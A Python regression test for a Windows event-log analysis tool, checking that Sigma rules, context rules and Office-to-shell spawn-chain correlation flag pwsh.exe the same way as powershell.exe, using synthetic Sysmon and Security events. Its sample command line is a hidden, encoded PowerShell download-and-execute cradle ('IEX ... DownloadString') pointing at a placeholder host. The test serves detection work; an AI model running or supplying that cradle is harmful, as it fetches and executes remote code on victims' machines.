"""PowerShell 7 (pwsh.exe) is detected like Windows PowerShell (powershell.exe).

Gemini audit 7-12 (High): every embedded Sigma PowerShell rule, the
parent -> child lineage rules and the Office -> shell spawn pairs named only
powershell.exe, so the same activity run with pwsh.exe matched nothing.

Expected: for Sysmon EID 1 and Security 4688 events with the same command
line and parent, pwsh.exe gets the same Sigma techniques and the same
context-rule tags as powershell.exe, and WINWORD.EXE -> pwsh.exe is a
critical spawn chain.  Synthetic events.
"""
import copy
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
CHECKS = []


def check(name, cond, detail=""):
    CHECKS.append((name, bool(cond), detail))
    print(f"  {'PASS' if cond else 'FAIL'}  {name}" + (f"  -- {detail}" if detail else ""), flush=True)


def main() -> int:
    from evtx_tool.analysis.sigma_rules import get_sigma_tags
    from evtx_tool.analysis.context_rules import apply_context_rules
    from evtx_tool.analysis.correlator import correlate
    PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    PW = r"C:\Program Files\PowerShell\7\pwsh.exe"
    WW = r"C:\Program Files\Office\WINWORD.EXE"
    cmd = "-NoP -W Hidden -Enc ZABlAGMAbwB5AA== ; IEX (New-Object Net.WebClient).DownloadString('http://x/a')"

    def sysmon(img, guid="{P}"):
        return {"record_id": 1, "event_id": 1, "timestamp": "2026-01-01T10:00:01.000000Z", "computer": "H",
                "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon",
                "source_file": "s.evtx",
                "event_data": {"Image": img, "CommandLine": f"{os.path.basename(img)} {cmd}", "ProcessGuid": guid,
                               "ParentProcessGuid": "{W}", "ParentImage": WW}}

    def sec(img):
        return {"record_id": 2, "event_id": 4688, "timestamp": "2026-01-01T10:00:01.000000Z", "computer": "H",
                "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "source_file": "s.evtx",
                "event_data": {"NewProcessName": img, "CommandLine": f"{os.path.basename(img)} {cmd}",
                               "ParentProcessName": WW}}

    def tids(ev):
        return sorted({t.get("tid") for t in (get_sigma_tags(ev) or [])})

    def ctx(ev):
        e = copy.deepcopy(ev)
        apply_context_rules(e)
        return sorted({t.get("tid") for t in (e.get("attack_tags") or [])} | set(e.get("context_tags") or []))
    for label, mk in (("Sysmon EID 1", sysmon), ("Security 4688", sec)):
        a, b = tids(mk(PS)), tids(mk(PW))
        check(f"{label}: pwsh.exe gets the same Sigma techniques ({a})", a and a == b, f"{a} vs {b}")
        a, b = ctx(mk(PS)), ctx(mk(PW))
        check(f"{label}: pwsh.exe gets the same context-rule tags", a == b, f"{a} vs {b}")
    tree = [{"record_id": 3, "event_id": 1, "timestamp": "2026-01-01T10:00:00.000000Z", "computer": "H",
             "channel": "Microsoft-Windows-Sysmon/Operational", "provider": "Microsoft-Windows-Sysmon",
             "source_file": "s.evtx", "event_data": {"Image": WW, "ProcessGuid": "{W}",
                                                    "ParentProcessGuid": "{E}", "ParentImage": "explorer.exe"}},
            sysmon(PW)]
    sev = [c["severity"] for c in correlate(tree) if c["rule_name"].startswith("Sysmon ProcessGuid")]
    check("WINWORD.EXE -> pwsh.exe is a critical spawn chain", "critical" in sev, str(sev))
    n = sum(ok for _, ok, _ in CHECKS)
    print(f"{n}/{len(CHECKS)} checks passed")
    return 0 if n == len(CHECKS) else 1


if __name__ == "__main__":
    sys.exit(main())
